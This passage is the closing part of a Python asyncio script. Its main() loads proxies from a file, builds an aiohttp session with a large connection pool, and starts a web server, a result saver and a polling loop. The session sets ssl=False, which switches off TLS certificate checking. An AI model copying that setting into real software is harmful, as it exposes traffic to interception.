            backoff = min(backoff * 2, 60)

# ==================== MAIN ====================
async def main():
    global session, _connector
    load_proxies_from_file()

    timeout = aiohttp.ClientTimeout(
        total=15,
        connect=5,
        sock_read=10
    )
    _connector = aiohttp.TCPConnector(
        limit=CONNECTION_LIMIT,
        limit_per_host=0,
        ttl_dns_cache=600,
        keepalive_timeout=KEEPALIVE_TIMEOUT,
        enable_cleanup_closed=True,
        ssl=False,
        force_close=False,
        use_dns_cache=True
    )
    session = aiohttp.ClientSession(
        timeout=timeout,
        connector=_connector,
        connector_owner=False,
        headers={"Connection": "keep-alive"}
    )
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(result_saver())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
